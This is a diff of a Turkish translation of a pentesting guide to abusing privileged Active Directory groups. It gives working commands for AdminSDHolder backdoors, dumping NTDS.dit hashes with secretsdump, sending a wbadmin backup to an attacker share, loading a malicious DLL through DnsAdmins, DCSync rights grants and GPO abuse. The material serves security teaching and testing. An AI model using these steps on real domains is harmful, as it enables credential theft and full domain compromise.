@@ -10,21 +10,21 @@
 
 ## Account Operators
 
-Bu grup, domain üzerinde yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Domain Controller (DC) üzerinde yerel oturum açmaya olanak tanır.
+Bu grup, etki alanında yönetici olmayan hesapları ve grupları oluşturma yetkisine sahiptir. Ayrıca, Etki Alanı Denetleyicisi (DC) üzerinde yerel oturum açmaya izin verir.
 
-Bu grubun üyelerini belirlemek için şu komut çalıştırılır:
+Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:
 ```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-Yeni kullanıcı eklemeye ve DC'ye yerel girişe izin veriliyor.
+Yeni kullanıcı eklemek ve DC'ye yerel giriş yapmak izinli.
 
 ## AdminSDHolder grubu
 
-**AdminSDHolder** grubunun Erişim Denetim Listesi (ACL), Active Directory içindeki tüm "protected groups" için (yüksek ayrıcalıklı gruplar dahil) izinleri belirlediği için kritik öneme sahiptir. Bu mekanizma, yetkisiz değişiklikleri engelleyerek bu grupların güvenliğini sağlar.
+**AdminSDHolder** grubunun Access Control List (ACL)'i, Active Directory içindeki tüm "protected groups" için — yüksek ayrıcalıklı gruplar da dahil — izinleri belirlediği için kritik öneme sahiptir. Bu mekanizma, yetkisiz değişiklikleri engelleyerek bu grupların güvenliğini sağlar.
 
-Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek standart bir kullanıcıya tam izin verebilir. Bu, o kullanıcının tüm protected groups üzerinde tam kontrole sahip olmasını sağlar. Bu kullanıcının izinleri değiştirilse veya kaldırılacak olursa, sistem tasarımı gereği bir saat içinde otomatik olarak yeniden atanır.
+Bir saldırgan, **AdminSDHolder** grubunun ACL'ini değiştirerek standart bir kullanıcıya tam yetki verip bunu suistimal edebilir. Bu, söz konusu kullanıcıya tüm protected groups üzerinde tam kontrol sağlar. Eğer bu kullanıcının izinleri değiştirilir veya kaldırılırsa, sistemin tasarımı gereği izinleri bir saat içinde otomatik olarak geri verilir.
 
-Son Windows Server dokümantasyonu, birkaç yerleşik operator grubunu hâlâ **protected** nesneler olarak ele alır (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, vb.). **SDProp** süreci varsayılan olarak **PDC Emulator** üzerinde her 60 dakikada bir çalışır, `adminCount=1` değerini atar ve protected nesnelerde miras devralmayı devre dışı bırakır. Bu, hem kalıcılık için hem de bir protected gruptan çıkarılmış ancak miras devralımı kapatılmış ACL'yi hâlâ koruyan eski ayrıcalıklı kullanıcıları tespit etmek için faydalıdır.
+Güncel Windows Server belgeleri hâlâ bazı yerleşik operator gruplarını **protected** nesneler olarak değerlendirir (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, vb.). **SDProp** süreci varsayılan olarak her 60 dakikada bir **PDC Emulator** üzerinde çalışır, `adminCount=1` değerini atar ve protected nesnelerde inheritance'ı devre dışı bırakır. Bu hem persistence için hem de protected grup üyeliğinden çıkarılmış ancak non-inheriting ACL'yi hâlâ koruyan eski ayrıcalıklı kullanıcıları tespit etmek için faydalıdır.
 
 Üyeleri incelemek ve izinleri değiştirmek için kullanılabilecek komutlar şunlardır:
 ```bash
@@ -38,17 +38,17 @@ Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
 Select-Object distinguishedName
 ```
-Restorasyon sürecini hızlandırmak için bir script mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Kurtarma sürecini hızlandırmak için bir betik mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-Daha fazla detay için ziyaret edin: [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+Daha fazla bilgi için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.
 
 ## AD Recycle Bin
 
-Bu grubun üyeliği, silinmiş Active Directory nesnelerinin okunmasına izin verir; bu hassas bilgileri açığa çıkarabilir:
+Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir; bu, hassas bilgileri açığa çıkarabilir:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinmiş nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPNs veya daha sonra başka bir operatör tarafından geri yüklenebilecek bir silinmiş ayrıcalıklı grubun DN'si gibi bilgileri açığa çıkarabilir.
+Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinmiş nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPNs veya daha sonra başka bir operatör tarafından geri yüklenebilecek silinmiş ayrıcalıklı bir grubun DN'si gibi bilgileri açığa çıkarabilir.
 ```powershell
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
 -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
@@ -60,15 +60,15 @@ DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir ü
 
 ### Yetki Yükseltme
 
-`PsService` veya Sysinternals'tan `sc` kullanarak servis izinlerini inceleyip değiştirebilirsiniz. Örneğin `Server Operators` grubu belirli servisler üzerinde tam kontrole sahiptir; bu da rastgele komutların yürütülmesine ve yetki yükseltmeye olanak tanır:
+Sysinternals'tan `PsService` veya `sc` kullanılarak hizmet izinleri incelenip değiştirilebilir. Örneğin `Server Operators` grubu bazı hizmetler üzerinde tam kontrole sahiptir; bu da herhangi bir komutun çalıştırılmasına ve yetki yükseltimine izin verir:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu gösterir; bu da ayrıcalık yükseltmek için servisleri değiştirmeye olanak tanır.
+Bu komut, `Server Operators`'ın tam erişime sahip olduğunu gösterir; bu da hizmetleri manipüle ederek ayrıcalık yükseltmeye olanak tanır.
 
 ## Backup Operators
 
-`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanılarak açık izinler olmasa bile klasörleri dolaşma, listeleme ve dosya kopyalama yeteneklerini mümkün kılar. Bu süreç için belirli scriptlerin kullanılması gerekir.
+`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanılarak açık izinler olmasa bile klasör dolaşımı, listeleme ve dosya kopyalama yeteneklerini sağlar. Bu işlem için belirli scriptlerin kullanılması gerekir.
 
 Grup üyelerini listelemek için şu komutu çalıştırın:
 ```bash
@@ -76,28 +76,28 @@ Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 ### Yerel Saldırı
 
-Bu ayrıcalıklardan yerel olarak yararlanmak için aşağıdaki adımlar uygulanır:
+Bu ayrıcalıkları yerel olarak kullanmak için aşağıdaki adımlar uygulanır:
 
 1. Gerekli kütüphaneleri içe aktarın:
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-2. Etkinleştir ve doğrula `SeBackupPrivilege`:
+2. `SeBackupPrivilege`'i etkinleştirin ve doğrulayın:
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Kısıtlı dizinlere erişip dosyaları kopyalayın, örneğin:
+3. Kısıtlı dizinlerdeki dosyalara erişin ve kopyalayın, örneğin:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-### AD Saldırısı
+### AD Attack
 
-Domain Controller'ın dosya sistemine doğrudan erişim, etki alanı kullanıcıları ve bilgisayarları için tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.
+Etki Alanı Denetleyicisi'nin dosya sistemine doğrudan erişim, alan kullanıcıları ve bilgisayarlar için tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.
 
-#### diskshadow.exe Kullanımı
+#### Using diskshadow.exe
 
 1. `C` sürücüsünün bir shadow copy'sini oluşturun:
 ```cmd
@@ -112,7 +112,7 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. Shadow copy'dan `NTDS.dit` dosyasını kopyalayın:
+2. Gölge kopyadan `NTDS.dit`'i kopyalayın:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
@@ -120,12 +120,12 @@ Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-3. Hash elde etmek için `SYSTEM` ve `SAM`'i çıkarın:
+3. Hash elde etmek için `SYSTEM` ve `SAM`'ı çıkarın:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-4. `NTDS.dit`'ten tüm hashes'i al:
+4. `NTDS.dit`'den tüm hashes'i al:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
@@ -139,8 +139,8 @@ netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec 
 ```
 #### wbadmin.exe Kullanımı
 
-1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemini yapılandırın ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
-2. Sistem yedeği ve `NTDS.dit` çıkarımı için `wbadmin.exe` kullanın:
+1. Saldırgan makinesinde SMB sunucusu için NTFS dosya sistemi oluşturun ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
+2. Sistem yedeği almak ve `NTDS.dit` çıkarmak için `wbadmin.exe`'yi kullanın:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -148,11 +148,11 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Pratik bir gösterim için [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Pratik bir gösterim için bakınız: [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-**DnsAdmins** grubunun üyeleri, ayrıcalıklarını bir DNS sunucusunda, çoğunlukla Etki Alanı Denetleyicilerinde barındırılan, SYSTEM ayrıcalıklarıyla rastgele bir DLL yüklemek için kullanabilir. Bu yetenek önemli ölçüde kötüye kullanım potansiyeli sağlar.
+Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
 
 DnsAdmins grubunun üyelerini listelemek için şunu kullanın:
 ```bash
@@ -161,9 +161,9 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ### Execute arbitrary DLL (CVE‑2021‑40469)
 
 > [!NOTE]
-> Bu zafiyet, DNS hizmetinde (genellikle DC'ler içinde) SYSTEM ayrıcalıklarıyla rastgele kod çalıştırılmasına olanak tanır. Bu sorun 2021'de düzeltildi.
+> Bu zafiyet, DNS servisinde (genellikle DCs içinde) SYSTEM ayrıcalıklarıyla rastgele kod çalıştırılmasına olanak tanır. Bu sorun 2021'de düzeltildi.
 
-Üyeler, aşağıdaki gibi komutları kullanarak DNS sunucusunun herhangi bir DLL'i (ya yerel olarak ya da uzak bir paylaşımdan) yüklemesini sağlayabilir:
+Üyeler, aşağıdaki gibi komutları kullanarak DNS sunucusunun rastgele bir DLL (yerel olarak veya uzak bir paylaşımdan) yüklemesini sağlayabilir:
 ```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -186,23 +186,23 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-DLL'in yüklenebilmesi için DNS hizmetinin yeniden başlatılması (ek izinler gerektirebilir) gereklidir:
+DLL'in yüklenmesi için DNS hizmetini yeniden başlatmak (ek izinler gerektirebilir) gereklidir:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Daha fazla bilgi için ired.team'e bakın.
+Bu saldırı vektörü hakkında daha fazla bilgi için ired.team'e bakın.
 
 #### Mimilib.dll
 
-Ayrıca mimilib.dll, komut yürütmek için kullanılabilir; belirli komutları veya reverse shells çalıştıracak şekilde değiştirilebilir. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
+mimilib.dll'i belirli komutları veya reverse shell'leri çalıştıracak şekilde değiştirerek komut yürütmek için kullanmak da mümkündür. Daha fazla bilgi için [bu gönderiye göz atın](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).
 
-### WPAD Record for MitM
+### MitM için WPAD Kaydı
 
-DnsAdmins, global query block listesini devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Responder veya Inveigh gibi araçlar spoofing ve ağ trafiğini yakalamak için kullanılabilir.
+DnsAdmins, global query block list'i devre dışı bırakıp bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Ağ trafiğini sahtelemek ve yakalamak için Responder veya Inveigh gibi araçlar kullanılabilir.
 
-### Event Log Readers
-Üyeler olay günlüklerine erişebilir; düz metin parolalar veya komut yürütme detayları gibi hassas bilgileri bulabilirler:
+### Olay Günlüğü Okuyucuları
+Üyeler olay günlüklerine erişebilir; açık metin şifreler veya komut yürütme ayrıntıları gibi hassas bilgileri bulabilirler:
 ```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -210,25 +210,25 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ```
 ## Exchange Windows İzinleri
 
-Bu grup domain nesnesindeki DACLs'i değiştirebilir; bu, potansiyel olarak DCSync ayrıcalıkları verebilir. Bu grubu kötüye kullanarak yapılan privilege escalation teknikleri Exchange-AD-Privesc GitHub repo'sunda ayrıntılı olarak açıklanmıştır.
+Bu grup domain nesnesi üzerindeki DACLs'leri değiştirebilir ve potansiyel olarak DCSync privileges verebilir. Bu grubu kullanarak yapılan privilege escalation teknikleri Exchange-AD-Privesc GitHub repo içinde detaylandırılmıştır.
 ```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
-Bu grubun üyesi olarak hareket edebiliyorsanız, klasik kötüye kullanım, saldırganın kontrolündeki bir principal'e [DCSync](dcsync.md) için gereken çoğaltma haklarını vermektir:
+Bu grubun üyesi olarak hareket edebiliyorsanız, klasik kötüye kullanım, saldırgan tarafından kontrol edilen bir principal'e [DCSync](dcsync.md) için gerekli replication rights vermektir:
 ```bash
 Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
 Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
 ```
-Tarihsel olarak, **PrivExchange** posta kutusu erişimini zincirleyerek, Exchange kimlik doğrulamasını zorlayarak ve LDAP relay kullanarak bu aynı ilkel hedefe ulaştı. O relay yolu engellense bile, `Exchange Windows Permissions` grubuna doğrudan üyelik veya bir Exchange sunucusunun kontrolü etki alanı çoğaltma hakları için yüksek değerli bir yol olmaya devam eder.
+Tarihi olarak, **PrivExchange** posta kutusu erişimini zincirleyerek, Exchange kimlik doğrulamasını zorlayarak ve LDAP relay yaparak aynı temel ayrıcalığa ulaşıyordu. Bu relay yolu giderilse bile, `Exchange Windows Permissions` üyeliği veya bir Exchange sunucusunun kontrolü etki alanı çoğaltma yetkileri için yüksek değerli bir yol olmaya devam eder.
 
-## Hyper-V Yöneticileri
+## Hyper-V Administrators
 
-Hyper-V Yöneticileri Hyper-V'ye tam erişime sahiptir; bu, sanallaştırılmış Etki Alanı Denetleyicileri (Domain Controllers) üzerinde kontrol sağlamak için kullanılabilir. Bu, canlı DC'leri klonlamayı ve `NTDS.dit` dosyasından NTLM hashlerini çıkarmayı içerir.
+Hyper-V Administrators, Hyper-V üzerinde tam erişime sahiptir ve bu erişim, sanallaştırılmış Domain Controller'lar üzerinde kontrol elde etmek için istismar edilebilir. Buna canlı DC'leri klonlamak ve NTDS.dit dosyasından NTLM hash'lerini çıkarmak dahildir.
 
 ### İstismar Örneği
 
-Pratik suistimal genellikle eski host-seviyesi LPE hileleri yerine **DC disklerine/checkpoint'lerine çevrimdışı erişim** şeklindedir. Hyper-V hostuna erişimi olan bir operatör, sanallaştırılmış bir Etki Alanı Denetleyicisini checkpoint yapabilir veya dışa aktarabilir, VHDX'i bağlayabilir ve misafir içindeki LSASS'e dokunmadan `NTDS.dit`, `SYSTEM` ve diğer sırları çıkarabilir:
+Pratik istismar genellikle eski host-seviyesi LPE numaralarından ziyade **DC disklerine/checkpoint'lerine offline erişim**dir. Hyper-V host'una erişimle, bir operatör sanallaştırılmış bir Domain Controller için checkpoint oluşturabilir veya dışa aktarım yapabilir, VHDX'i bağlayabilir ve `NTDS.dit`, `SYSTEM` ve diğer sırları misafir içindeki LSASS'e dokunmadan çıkarabilir:
 ```bash
 # Host-side enumeration
 Get-VM
@@ -237,19 +237,19 @@ Get-VHD -VMId <vm-guid>
 # After exporting or checkpointing the DC, mount the disk read-only
 Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
 ```
-Oradan, `Backup Operators` iş akışını yeniden kullanarak `Windows\NTDS\ntds.dit` ve registry hive'larını çevrimdışı kopyalayın.
+Bundan sonra, `Backup Operators` iş akışını yeniden kullanarak `Windows\NTDS\ntds.dit` ve kayıt defteri hive'lerini çevrimdışı olarak kopyalayın.
 
 ## Group Policy Creators Owners
 
-Bu grup, üyelerine etki alanında Group Policies oluşturma izni verir. Ancak üyeleri Group Policies'i kullanıcılara veya gruplara uygulayamaz ya da mevcut GPO'ları düzenleyemez.
+Bu grup, üyelerin etki alanında Group Policy oluşturmalarına izin verir. Ancak üyeler kullanıcı veya gruplara Group Policy uygulayamazlar ya da mevcut GPO'ları düzenleyemezler.
 
-Önemli nüans şudur ki **oluşturan kişi yeni GPO'nun sahibi olur** ve genellikle sonradan onu düzenlemek için yeterli hakları elde eder. Bu, bu grubun şu durumlarda ilginç olduğu anlamına gelir:
+Önemli nüans şudur: **oluşturan kişi yeni GPO'nun sahibi olur** ve genellikle sonrasında onu düzenlemek için yeterli haklara sahip olur. Bu nedenle bu grup, şu durumlarda ilgi çekicidir:
 
-- kötü niyetli bir GPO oluşturmak ve bir admini onu hedef OU/domain'e bağlamaya ikna etmek
-- zaten bir yerde kullanışlı biçimde bağlı olan ve sizin oluşturduğunuz bir GPO'yu düzenlemek
-- bu grup size düzenleme hakkını verirken, GPO'ları bağlamanıza izin veren başka bir delege edilmiş hakkı suistimal etmek
+- kötü amaçlı bir GPO oluşturup bir yöneticiyi hedef OU/domain'e bağlaması için ikna etmek
+- zaten faydalı bir yere bağlı olan sizin oluşturduğunuz bir GPO'yu düzenlemek
+- GPO'ları linklemeye izin veren başka bir delege edilmiş hakkı istismar etmek; bu grup ise size düzenleme tarafını sağlar
 
-Pratik suistimal genellikle SYSVOL destekli policy dosyaları aracılığıyla bir **Immediate Task**, **startup script**, **local admin membership**, veya **user rights assignment** değişikliği eklemek demektir.
+Pratik istismar genellikle SYSVOL destekli politika dosyaları aracılığıyla bir **Immediate Task**, **startup script**, **local admin membership** veya **user rights assignment** değişikliği eklemek anlamına gelir.
 ```bash
 # Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
 SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
@@ -270,41 +270,41 @@ To list the members of this group, the following PowerShell command is used:
 ```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Domain Controller'larda bu grup tehlikelidir çünkü varsayılan Domain Controller Policy, **`SeLoadDriverPrivilege`** hakkını `Print Operators`'a verir. Bu grubun bir üyesi için yükseltilmiş bir token'e ulaşırsanız, ayrıcalığı etkinleştirip imzalanmış-ama-zafiyetli bir sürücüyü yükleyerek kernel/SYSTEM'e geçiş yapabilirsiniz. Token işlemleriyle ilgili detaylar için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) sayfasına bakın.
+Domain Controllers üzerinde bu grup tehlikelidir çünkü varsayılan Domain Controller Policy `Print Operators`'a **`SeLoadDriverPrivilege`** verir. Eğer bu grubun bir üyesi için yükseltilmiş bir token elde ederseniz, ayrıcalığı etkinleştirip imzalı ama zafiyetli bir sürücü yükleyerek kernel/SYSTEM'e atlayabilirsiniz. Token işleme detayları için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) sayfasına bakın.
 
 #### Remote Desktop Users
 
-Bu grubun üyelerine PC'lere Remote Desktop Protocol (RDP) üzerinden erişim verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
+Bu grubun üyelerine Remote Desktop Protocol (RDP) üzerinden PC erişimi verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
 ```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-RDP'yi istismar etmeye dair daha fazla ayrıntı özel pentesting kaynaklarında bulunabilir.
+RDP'yi istismar etmeye dair daha fazla bilgi özel pentesting kaynaklarında bulunabilir.
 
 #### Uzaktan Yönetim Kullanıcıları
 
-Üyeler **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin Enumeration'ı şu yollarla gerçekleştirilir:
+Üyeler, **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin enumeration'ı şu yollarla gerçekleştirilir:
 ```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-**WinRM** ile ilgili istismar teknikleri için özel dokümantasyona başvurulmalıdır.
+**WinRM** ile ilgili istismar teknikleri için özel dokümantasyon incelenmelidir.
 
 #### Sunucu Operatörleri
 
-Bu grup, Etki Alanı Denetleyicileri üzerinde yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma gibi çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir. Üyeleri listelemek için verilen komut:
+Bu grup, Etki Alanı Denetleyicileri üzerinde yedekleme ve geri yükleme ayrıcalıkları, sistem zamanını değiştirme ve sistemi kapatma dahil olmak üzere çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir. Üyeleri listelemek için verilen komut şudur:
 ```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-Etki Alanı Denetleyicilerinde, `Server Operators` genellikle servisleri **yeniden yapılandırma veya başlatma/durdurma** için yeterli hakları miras alır ve ayrıca varsayılan DC politikası aracılığıyla `SeBackupPrivilege`/`SeRestorePrivilege` elde ederler. Pratikte bu, onları **service-control abuse** ile **NTDS extraction** arasında bir köprü yapar:
+Etki Alanı Denetleyicilerinde, `Server Operators` genellikle **hizmetleri yeniden yapılandırmak veya başlat/durdurmak** için yeterli haklara sahiptir ve varsayılan DC politikası yoluyla `SeBackupPrivilege`/`SeRestorePrivilege` alırlar. Pratikte, bu onları **service-control abuse** ile **NTDS extraction** arasında bir köprü haline getirir:
 ```cmd
 sc.exe \\dc01 query
 sc.exe \\dc01 qc <service>
 .\PsService.exe security <service>
 ```
-Eğer bir service ACL bu gruba change/start hakları veriyorsa, servisi rastgele bir komuta yönlendirin, `LocalSystem` olarak başlatın ve sonra orijinal `binPath`'i geri yükleyin. Eğer service control kısıtlanmışsa, `NTDS.dit`'i kopyalamak için yukarıdaki `Backup Operators` tekniklerine geri dönün.
+Eğer bir service ACL bu gruba change/start hakları veriyorsa, servisi rastgele bir komuta yönlendirip `LocalSystem` olarak başlatın ve sonra orijinal `binPath`'i geri yükleyin. Service control kilitliyse, `NTDS.dit`'i kopyalamak için yukarıdaki `Backup Operators` tekniklerine başvurun.
 
-## Kaynaklar <a href="#references" id="references"></a>
+## Referanslar <a href="#references" id="references"></a>
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
